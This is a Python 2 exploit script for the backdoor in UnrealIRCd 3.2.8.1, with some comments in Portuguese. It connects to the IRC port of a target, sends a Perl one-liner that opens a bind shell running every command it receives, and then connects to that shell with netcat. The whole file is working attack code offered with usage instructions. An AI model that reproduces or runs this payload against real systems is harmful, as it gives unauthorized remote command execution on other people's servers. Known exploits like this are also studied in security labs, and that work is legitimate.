# -*- coding: utf-8 -*-
#!/usr/bin/python

import socket
import sys
import time
import os

if len(sys.argv) <= 2:
	print "\n        EXPLOIT - BIND SHELL\n"
	print "   - Backdoor Command Execution -"
	print "   tested on: UnrealIRCd 3.2.8.1\n"
	print " Usage:"
	print " ./"+sys.argv[0]+" [TARGET IP] [TCP PORT TO OPEN]"
	print " Example:"
	print " ./"+sys.argv[0]+" 192.168.10.106 4444"
else:
	print "\n        EXPLOIT - BIND SHELL\n"
	print "   - Backdoor Command Execution -"
	print "   tested on: UnrealIRCd 3.2.8.1\n"
	print " [*] Generating payload..."

	# Monta o payload
	payload="AB;perl -MIO -e '$p=fork();exit,if$p;foreach my $key(keys %ENV){if($ENV{$key}=~/(.*)/){$ENV{$key}=$1;}}$c=new IO::Socket::INET(LocalPort,"+sys.argv[2]+",Reuse,1,Listen)->accept;$~->fdopen($c,w);STDIN->fdopen($c,r);while(<>){if($_=~ /(.*)/){system $1;}};'"
	
	# Conecta no alvo
	print " [*] Connecting to "+sys.argv[1]+":6667..."
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((sys.argv[1],6667))
	
	# Envia o payload
	print " [*] Sending payload...\n"
	s.send(payload)
	time.sleep(15)
	os.system("nc -vn "+sys.argv[1]+" "+sys.argv[2])
